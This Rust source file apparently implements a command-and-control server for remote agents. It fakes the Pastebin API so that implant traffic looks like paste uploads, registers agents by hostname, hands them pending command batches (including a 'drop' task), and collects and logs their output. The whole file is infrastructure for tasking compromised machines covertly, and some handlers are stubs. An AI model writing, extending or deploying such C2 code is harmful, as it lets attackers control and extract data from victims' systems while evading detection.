use axum::{
    extract::{Path, State},
    response::{Html, IntoResponse, Response},
    routing::{get, post},
    Form, Json, Router,
};
use serde::{Deserialize, Serialize};
use std::sync::Arc;
use tokio::sync::Mutex;
use crate::crux::state::{AppState, process_agent_message};
use crate::api::pastebin::models::{AgentMessage, Paste};
use crate::crux::models::{Agent, Task, TaskResult};
use tokio::sync::mpsc;
use tracing::{info, debug, warn};

#[derive(Deserialize)]
pub struct PastePostForm {
    pub api_dev_key: String,
    pub api_paste_code: String,
    pub api_paste_private: Option<String>,
    pub api_paste_name: Option<String>,
    pub api_paste_expire_date: Option<String>,
    pub api_paste_format: Option<String>,
    pub api_user_key: Option<String>,
}

pub async fn run_server(app_state: Arc<Mutex<AppState>>, port: u16) {
    let app = Router::new()
        .route("/api/api_post.php", post(handle_paste_post))
        .route("/api/api_raw.php", post(handle_paste_raw)) // Pastebin uses POST for raw sometimes, or GET
        .route("/raw/:id", get(handle_get_raw)) // Fallback/Alternative
        .route("/api/agent/register", post(handle_agent_register))
        .route("/api/agent/tasks/:id", get(handle_agent_tasks))
        .route("/api/agent/results/:id", post(handle_agent_results))
        .with_state(app_state);

    let addr = format!("0.0.0.0:{}", port);
    info!("Listening on {}", addr);
    
    let listener = tokio::net::TcpListener::bind(&addr).await.unwrap();
    axum::serve(listener, app).await.unwrap();
}

async fn handle_paste_post(
    State(state): State<Arc<Mutex<AppState>>>,
    Form(payload): Form<PastePostForm>,
) -> impl IntoResponse {
    let mut state = state.lock().await;
    
    // Generate a fake key
    let key = format!("{}{}", 
        (chrono::Utc::now().timestamp() % 10000), 
        rand::random::<u16>()
    );
    let url = format!("https://pastebin.com/{}", key); // The agent expects a URL

    debug!("Received paste drop. Key: {}, Name: {:?}", key, payload.api_paste_name);
    state.logs.push(crate::crux::state::LogEntry {
        message: format!("[HTTP] Paste dropped: {} ({})", key, payload.api_paste_name.as_deref().unwrap_or("Unknown")),
        level: "INFO".to_string(),
        count: 1,
        timestamp: chrono::Utc::now().timestamp(),
    });

    // Create a dummy Paste object
    let paste = Arc::new(Paste {
        paste_key: key.clone(),
        paste_date: chrono::Utc::now().timestamp(),
        paste_title: payload.api_paste_name.clone().unwrap_or("Unknown".to_string()),
        paste_size: payload.api_paste_code.len() as u64,
        paste_expire_date: 0,
        paste_private: 1,
        paste_format_long: "json".to_string(),
        paste_format_short: "json".to_string(),
        paste_url: url.clone(),
        paste_hits: 0,
    });
    
    state.pastes.push(paste);

    // Try to parse content as AgentMessage
    let content = payload.api_paste_code.clone();
    let agent_msg = serde_json::from_str::<AgentMessage>(&content).unwrap_or(AgentMessage {
        msg_type: "raw".to_string(),
        payload: content.clone(),
        timestamp: None,
    });
    
    // We need a mock_tx to pass to process_agent_message. 
    // Ideally, we should store this tx in AppState or pass it to run_server.
    // For now, we'll create a dummy channel just to satisfy the signature, 
    // BUT this means the "mock agent" response won't go anywhere if triggered from here.
    // This is acceptable for the "Real" agent which doesn't use the mock loop.
    let (tx, _) = mpsc::channel(1);
    process_agent_message(&mut state, agent_msg.clone(), tx).await;

    state.paste_content.insert(key.clone(), agent_msg);
    
    url
}

async fn handle_paste_raw(
    State(_state): State<Arc<Mutex<AppState>>>,
) -> impl IntoResponse {
    // This is usually used by the C2 to READ the paste.
    // For the dummy, we might need to store the content in handle_paste_post
    "TODO: Implement Raw Read"
}

async fn handle_get_raw(
    Path(id): Path<String>,
    State(state): State<Arc<Mutex<AppState>>>,
) -> impl IntoResponse {
    {
        let mut state = state.lock().await;
        state.logs.push(crate::crux::state::LogEntry {
            message: format!("[HTTP] Raw fetch for {}", id),
            level: "INFO".to_string(),
            count: 1,
            timestamp: chrono::Utc::now().timestamp(),
        });
    }

    if id == "dummy_cmds" {
        // Return a test command batch (plaintext JSON)
        // MUST match CommandBatch struct in protocol.h
        return r#"{
            "batch_id": "debug_batch_1",
            "timestamp": 1700000000,
            "commands": [
                {
                    "id": "task_drop_1",
                    "type": "drop",
                    "args": ["auto"], 
                    "ttl": 60
                }
            ]
        }"#.to_string();
    }

    format!("Raw content for {}", id)
}

async fn handle_agent_register(
    State(state): State<Arc<Mutex<AppState>>>,
    Json(agent): Json<Agent>,
) -> impl IntoResponse {
    let mut state = state.lock().await;
    info!("Agent registered: {} ({})", agent.id, agent.hostname);
    state.logs.push(crate::crux::state::LogEntry {
        message: format!("[HTTP] Agent registered: {} @ {}", agent.id, agent.hostname),
        level: "INFO".to_string(),
        count: 1,
        timestamp: chrono::Utc::now().timestamp(),
    });
    
    state.agents.insert(agent.id.clone(), agent);
    
    "Registered"
}

async fn handle_agent_tasks(
    Path(id): Path<String>,
    State(state): State<Arc<Mutex<AppState>>>,
) -> impl IntoResponse {
    let mut state = state.lock().await;
    
    if let Some(tasks) = state.tasks.get_mut(&id) {
        let pending: Vec<Task> = tasks.iter()
            .filter(|t| t.status == "pending")
            .cloned()
            .collect();
            
        // Mark as sent (in a real app, we'd wait for ack, but here we assume sent)
        for task in tasks.iter_mut() {
            if task.status == "pending" {
                task.status = "sent".to_string();
            }
        }
        
        if !pending.is_empty() {
             debug!("Sending {} tasks to agent {}", pending.len(), id);
             return Json(pending).into_response();
        }
    }
    
    Json(Vec::<Task>::new()).into_response()
}

async fn handle_agent_results(
    Path(id): Path<String>,
    State(state): State<Arc<Mutex<AppState>>>,
    Json(result): Json<TaskResult>,
) -> impl IntoResponse {
    let mut state = state.lock().await;
    
    info!("Received result for task {} from agent {}", result.task_id, id);
    state.logs.push(crate::crux::state::LogEntry {
        message: format!("[HTTP] Task {} completed by {}", result.task_id, id),
        level: "INFO".to_string(),
        count: 1,
        timestamp: chrono::Utc::now().timestamp(),
    });
    state.logs.push(crate::crux::state::LogEntry {
        message: format!("Output:\n{}", result.output),
        level: "INFO".to_string(),
        count: 1,
        timestamp: chrono::Utc::now().timestamp(),
    });
    
    // Update task status if we were tracking it
    if let Some(tasks) = state.tasks.get_mut(&id) {
        if let Some(task) = tasks.iter_mut().find(|t| t.id == result.task_id) {
            task.status = "completed".to_string();
        }
    }
    
    // Also trigger the generic process_agent_message for TUI updates if needed
    // (e.g. if the task was "sysinfo" or "ls")
    // For now, we just log it.
    
    "Received"
}
